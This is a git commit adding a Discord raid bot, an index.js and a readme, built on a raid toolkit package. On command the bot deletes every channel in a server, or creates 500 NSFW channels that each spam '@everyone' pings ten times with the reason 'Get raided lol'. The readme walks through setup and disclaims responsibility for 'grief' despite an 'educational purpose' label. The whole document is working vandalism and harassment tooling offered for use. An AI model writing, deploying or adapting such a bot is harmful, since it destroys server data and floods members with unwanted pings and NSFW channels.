1d415a03e79a01627def9e4a4303e4a4c0c80aaa
themoi777 <75712444+themoi777@users.noreply.github.com>
2021-06-22 15:18:17 +0530

    Add files via upload

---
+++ index.js
@@ -0,0 +1,20 @@
+const Discord = require('discord.js') //we require discord
+const client = new Discord.Client() //setting/creating a new discord client (bot)
+
+const Disc_rd = require('discord-raid-toolkit-revamp')
+const raid = new Disc_rd.RaidBot(client) //here we pass client parameter, as you see i set it as client because that is the name i put it as in const **client**
+
+client.on('message', async message => {
+	if(message.content.startsWith('!deletechannels')) {
+	await raid.deleteAllChannels(message.guild.id) //deleting every channel in the guild with the id provided, in this case, the current guild where command was executed
+}
+})
+
+client.on('message', message => {
+    if(message.content.startsWith('!channel')) {
+        raid.createChannelsLoop(message.guild.id, {amount_of_created_channels: 500, message_that_will_be_sent: "@everyone gg", times_message_is_sent: 10, channels_name: "gg", reason_channels: "Get raided lol", channels_topic: "gg", nsfw: true, channel_cooldown: 10}) //btw channel_cooldown is put in seconds, like, i put 10 so channel cooldown will be 10 seconds, you can always try the code and understand it the max possible
+    }
+    })
+
+
+client.login('YOUR_DISCORD_TOKEN')
---
+++ readme.txt
@@ -0,0 +1,38 @@
+This is a Educational and Experimental Purpose Bot
+
+
+Made by BeeXD#7777
+
+
+First install Npm packages 
+
+Discord.js - npm install discord.js
+
+Raid package - npm i discord-raid-toolkit-revamp
+
+------------------------------------------------------------
+How to start?
+
+From Discord developer portal ,Make a Application
+then go to bot and copy the token
+
+Paste the token in the last line of index.js
+
+and run !!
+
+############
+Commands
+!channel - make a unlimited channels and pings everyone
+
+
+!deletechannels - Deletes every channels
+
+
+
+###########
+DISCLAIMER
+
+-I am not responsible for any grief in your server
+-I made this bot for educational purpose
+-I will not add any features.
+
